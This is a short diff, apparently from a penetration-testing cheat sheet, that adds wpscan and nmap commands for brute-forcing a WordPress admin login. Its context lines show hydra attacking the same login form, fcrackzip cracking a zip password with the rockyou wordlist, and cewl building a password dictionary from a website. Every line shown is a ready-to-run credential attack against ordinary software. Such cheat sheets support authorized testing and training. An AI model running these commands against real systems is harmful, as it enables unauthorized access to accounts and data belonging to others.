@@ -23,6 +23,8 @@ fcrackzip -v -b -D -p /usr/share/wordlists/rockyou.txt -u file.zip
 
 # Bruteforce Wordpress login using wordlist
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+wpscan -u 10.10.10.10 --wordlist /usr/share/wordlists/dirb/others/best1050.txt --username admin
+nmap -p 80 --script=http-wordpress-brute 10.10.10.10
 
 # Password dictionary generation
 cewl www.domain.com -m 6 -w domain_dic.txt
